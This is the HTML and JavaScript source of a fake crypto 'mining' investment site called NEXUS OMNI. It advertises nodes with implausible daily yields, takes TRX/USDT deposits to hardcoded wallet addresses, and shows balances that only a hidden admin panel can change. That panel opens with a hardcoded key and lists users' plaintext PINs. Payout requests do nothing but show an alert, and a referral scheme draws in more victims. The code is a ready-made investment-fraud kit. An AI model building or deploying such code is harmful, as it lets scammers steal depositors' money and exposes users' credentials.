<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Professional Mining Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
        
        :root { --n-blue: #2563eb; --n-dark: #0f172a; }

        body { 
            background: #f8fafc; 
            color: #0f172a !important; 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            -webkit-tap-highlight-color: transparent; 
        }
        
        /* Visibility Overrides */
        p, h1, h2, h3, h4, span, label { color: #0f172a !important; }
        .text-white { color: #ffffff !important; }
        .text-blue-600 { color: #2563eb !important; }
        .text-emerald-500 { color: #10b981 !important; }

        .glass-card { 
            background: #ffffff !important; 
            border-radius: 35px; 
            box-shadow: 0 10px 40px rgba(0,0,0,0.06); 
            border: 1px solid #e2e8f0; 
        }

        .input-prime { 
            background: #ffffff !important; 
            color: #0f172a !important; 
            border: 2px solid #cbd5e1 !important; 
            border-radius: 22px; 
            padding: 18px; 
            width: 100%; 
            font-weight: 700; 
            outline: none;
        }

        .node-card { 
            background: #ffffff !important; 
            border-radius: 30px; 
            display: flex; 
            height: 160px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.04); 
            margin-bottom: 20px; 
            border: 1px solid #f1f5f9; 
            overflow: hidden;
            position: relative;
        }

        .tier-tag { 
            position: absolute; top: 10px; right: 10px; 
            padding: 4px 10px; border-radius: 10px; 
            font-size: 8px; font-weight: 900; 
            text-transform: uppercase; z-index: 10;
        }
        .bg-bronze { background: #fef3c7; color: #92400e !important; }
        .bg-silver { background: #f1f5f9; color: #475569 !important; }
        .bg-gold { background: #fff7ed; color: #c2410c !important; border: 1px solid #ffedd5; }

        nav { background: #ffffff !important; border-top: 1px solid #f1f5f9; box-shadow: 0 -5px 20px rgba(0,0,0,0.02); }
        .nav-link { color: #94a3b8 !important; font-size: 10px; font-weight: 800; text-align: center; flex: 1; }
        .nav-link.active { color: #2563eb !important; }

        .btn-prime { background: #0f172a !important; color: #ffffff !important; border-radius: 22px; font-weight: 800; padding: 18px; width: 100%; text-transform: uppercase; letter-spacing: 1px; }

        #preloader { position: fixed; inset: 0; background: #fff; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-14 h-14 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-4 text-[10px] font-black text-slate-900 uppercase tracking-widest">NEXUS INITIALIZING...</p>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center">
                <h1 class="text-6xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-[6px] mt-2">Institutional Protocol</p>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="l-pass" placeholder="PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Verify & Enter</button>
                <p onclick="toggleAuth(true)" class="text-center text-[11px] font-black text-blue-600 uppercase cursor-pointer">Register New Account</p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Choose Account ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="Create Security PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Initialize</button>
                <p onclick="toggleAuth(false)" class="text-center text-[11px] font-black text-slate-500 uppercase cursor-pointer">Already have an account?</p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-44">
        <header class="p-6 sticky top-0 z-50 bg-white/90 backdrop-blur-xl border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-slate-900 text-white rounded-[22px] flex items-center justify-center text-2xl font-black">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black uppercase">---</p>
                    <div id="kyc-badge" class="text-[9px] font-black uppercase px-2 py-0.5 rounded-md bg-amber-100 text-amber-700 mt-1">Pending KYC</div>
                </div>
            </div>
            <div class="flex gap-2">
                <a href="https://t.me/your_telegram" target="_blank" class="w-12 h-12 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center text-xl shadow-sm border border-blue-100"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="logout()" class="w-12 h-12 rounded-2xl bg-slate-50 text-slate-400 flex items-center justify-center"><i class="fa-solid fa-power-off"></i></button>
            </div>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="glass-card p-10 bg-slate-900 !text-white relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-[4px]">Mining Liquidity</p>
                    <h2 id="ui-bal" class="text-5xl font-black mt-3 tracking-tighter text-white !important">$0.00</h2>
                    
                    <div class="h-[100px] mt-6"><canvas id="hashChart"></canvas></div>

                    <div class="mt-8 pt-8 border-t border-white/10 flex justify-between items-end">
                        <div>
                            <p class="text-[8px] text-slate-500 uppercase font-black">Yield Status</p>
                            <p id="ui-prof" class="text-2xl font-black text-emerald-400">+$0.00</p>
                        </div>
                        <div class="text-right">
                            <p class="text-[8px] text-slate-500 uppercase font-black">Shield Code</p>
                            <p id="anti-phish" class="text-xs font-black text-blue-400">NX-7782</p>
                        </div>
                    </div>
                </div>
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-blue-600/10 rounded-full blur-[100px]"></div>
            </div>

            <div class="flex gap-4 overflow-x-auto pb-2 no-scrollbar">
                <div class="bg-white p-6 rounded-[30px] min-w-[160px] shadow-sm border border-slate-200">
                    <span class="text-[8px] font-black text-emerald-600 bg-emerald-50 px-2 py-1 rounded-lg uppercase">Bronze</span>
                    <p class="text-xs font-black mt-3">1.2x Multiplier</p>
                </div>
                <div class="bg-white p-6 rounded-[30px] min-w-[160px] shadow-sm border border-slate-200">
                    <span class="text-[8px] font-black text-blue-600 bg-blue-50 px-2 py-1 rounded-lg uppercase">Silver</span>
                    <p class="text-xs font-black mt-3">1.8x Multiplier</p>
                </div>
                <div class="bg-white p-6 rounded-[30px] min-w-[160px] shadow-sm border border-slate-200">
                    <span class="text-[8px] font-black text-amber-600 bg-amber-50 px-2 py-1 rounded-lg uppercase">Gold</span>
                    <p class="text-xs font-black mt-3">2.5x Multiplier</p>
                </div>
            </div>

            <div class="glass-card p-8 bg-blue-600 flex justify-between items-center shadow-lg shadow-blue-100">
                <div>
                    <h4 class="text-sm font-black uppercase italic text-white !important">Affiliate Hub</h4>
                    <p class="text-[10px] font-bold text-white !important opacity-80 mt-1">Earn 12% on referrals</p>
                </div>
                <button onclick="copyRef()" class="bg-white text-blue-600 px-6 py-3 rounded-2xl text-[10px] font-black uppercase shadow-sm">Invite</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-2">Active Protocols</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 hidden">
            <h3 class="text-lg font-black uppercase mb-8 tracking-tighter">Infrastructure Nodes</h3>
            <div id="elite-box" class="space-y-4 mb-10"></div>
            <div id="retail-box" class="space-y-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-8 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase text-blue-600">Capital Injection</h3>
                <select id="d-asset" class="input-prime" onchange="updAddr()">
                    <option value="">Select Asset Protocol</option>
                    <option value="TRX">TRX (TRC20)</option>
                    <option value="USDT">USDT (TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-6">
                    <p id="addr-txt" class="text-[12px] font-mono font-black text-blue-700 p-5 bg-blue-50 rounded-[25px] break-all text-center border-2 border-blue-100"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Transaction Hash ID" class="input-prime">
                    <button onclick="sendD()" class="btn-prime">Submit Audit</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6 border-t-8 border-slate-900">
                <h3 class="text-xs font-black uppercase text-slate-400">Institutional Payout</h3>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="w-acc" placeholder="Wallet / Bank Details" class="input-prime">
                <button onclick="sendW()" class="btn-prime !bg-blue-600">Request Payout</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 hidden"><div id="ledger-box" class="space-y-4"></div></main>

        <nav class="fixed bottom-0 left-0 right-0 h-24 flex justify-around items-center px-4 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-grid-2 text-2xl mb-1"></i><br>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-microchip text-2xl mb-1"></i><br>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-vault text-2xl mb-1"></i><br>VAULT</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-list-check text-2xl mb-1"></i><br>LEDGER</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b pb-6">
            <h2 class="text-xl font-black uppercase text-blue-600">Terminal Admin</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div id="adm-users" class="space-y-4 mb-10"></div>
        <div id="adm-reqs" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        // 20 Professional Nodes Data
        const nodeData = {
            elite: Array.from({length: 5}, (_, i) => ({ id: `e${i}`, name: `Omni Sovereign G${i+1}`, price: 5000+(i*5000), daily: 800+(i*700), tier: 'gold', img: `https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400&sig=e${i}` })),
            retail: Array.from({length: 15}, (_, i) => ({ id: `r${i}`, name: `Nexus Node v${i+1}`, price: 100+(i*300), daily: 15+(i*40), tier: i > 8 ? 'silver' : 'bronze', img: `https://images.unsplash.com/photo-1518770660439-4636190af475?w=300&sig=r${i}` }))
        };

        window.onload = () => {
            renderNodes();
            initChart();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1200);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        function initChart() {
            const ctx = document.getElementById('hashChart').getContext('2d');
            new Chart(ctx, {
                type: 'line',
                data: { labels: ['', '', '', '', '', '', ''], datasets: [{ data: [30, 55, 40, 75, 50, 90, 65], borderColor: '#3b82f6', tension: 0.4, borderWidth: 3, pointRadius: 0, fill: false }]},
                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false }}, scales: { x: { display: false }, y: { display: false }}}
            });
        }

        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Access Denied.");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, kyc: 'Pending', phishCode: 'NX-'+Math.floor(1000+Math.random()*9000) }); toggleAuth(false); }
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                document.getElementById('anti-phish').innerText = d.phishCode || 'NX-4421';
                const kyc = document.getElementById('kyc-badge');
                kyc.innerText = d.kyc === 'Verified' ? 'Verified Tier' : 'Pending KYC';
                kyc.className = `text-[9px] font-black uppercase px-2 py-0.5 rounded-md ${d.kyc === 'Verified' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'} mt-1`;
                
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-8 border-blue-600">
                        <p class="font-black uppercase text-slate-800">${v.name}</p>
                        <i class="fa-solid fa-circle-notch fa-spin text-blue-600"></i>
                    </div>`).join('') || '<p class="text-center py-5 text-slate-400 font-bold uppercase text-[10px]">No protocols online</p>';
            });
        }

        window.renderNodes = () => {
            const ui = (n) => `
                <div class="node-card">
                    <span class="tier-tag bg-${n.tier}">${n.tier}</span>
                    <img src="${n.img}" class="w-[130px] object-cover">
                    <div class="p-5 flex-1 flex flex-col justify-center">
                        <h4 class="font-black uppercase text-[13px]">${n.name}</h4>
                        <p class="text-[10px] font-black text-emerald-600 mt-1">Yield: $${n.daily.toLocaleString()}/day</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-xl font-black text-slate-900">$${n.price.toLocaleString()}</span>
                            <button onclick="buyNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        };

        window.buyNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr'), s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < price) return alert("Insufficient Capital.");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${uid}/nodes`), { name, deployedAt: Date.now() });
            alert("Deployment Successful!"); nav('home');
        };

        // Admin Secret Trigger
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Auth Key:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; }
        };

        function runAdm() {
            onValue(ref(db, 'users'), (s) => {
                const u = s.val();
                document.getElementById('adm-users').innerHTML = u ? Object.entries(u).map(([id, d]) => `
                    <div class="bg-slate-50 p-5 rounded-3xl space-y-3">
                        <p class="font-black text-[10px] uppercase">${id} (PIN: ${d.password})</p>
                        <div class="flex gap-2">
                            <button onclick="modBal('${id}','add')" class="bg-emerald-600 text-white text-[8px] font-black px-3 py-2 rounded-xl">ADD $</button>
                            <button onclick="verifyKYC('${id}')" class="bg-blue-600 text-white text-[8px] font-black px-3 py-2 rounded-xl">VERIFY</button>
                        </div>
                    </div>`).join('') : '';
            });
        }

        window.verifyKYC = async (uid) => await update(ref(db, `users/${uid}`), { kyc: 'Verified' });
        window.modBal = async (uid, type) => { const val = prompt("Amount:"); if(!val) return; const s = await get(ref(db, `users/${uid}`)); await update(ref(db, `users/${uid}`), { balance: (s.val().balance || 0) + parseFloat(val) }); };
        window.copyRef = () => { alert("Referral Link Copied!"); };
        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value, map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.sendD = () => { alert("Audit Initialized"); nav('ledger'); };
        window.sendW = () => { alert("Request Sent"); nav('ledger'); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
